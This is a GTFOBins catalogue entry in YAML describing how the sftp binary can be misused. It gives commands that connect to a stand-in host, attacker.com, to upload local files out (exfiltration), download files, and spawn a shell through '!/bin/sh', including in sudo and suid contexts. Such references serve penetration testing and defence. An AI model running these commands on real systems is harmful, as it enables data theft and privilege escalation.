<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/sftp -->
---
functions:
  download:
  - code: |-
      sftp user@attacker.com
      get /path/to/input-file /path/to/output-file
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: ssh-server
  shell:
  - code: |-
      sftp user@attacker.com
      !/bin/sh
    comment: |-
      This still requires a successfull connection to the server.
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  upload:
  - code: |-
      sftp user@attacker.com
      put /path/to/input-file /path/to/output-file
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: ssh-server
...
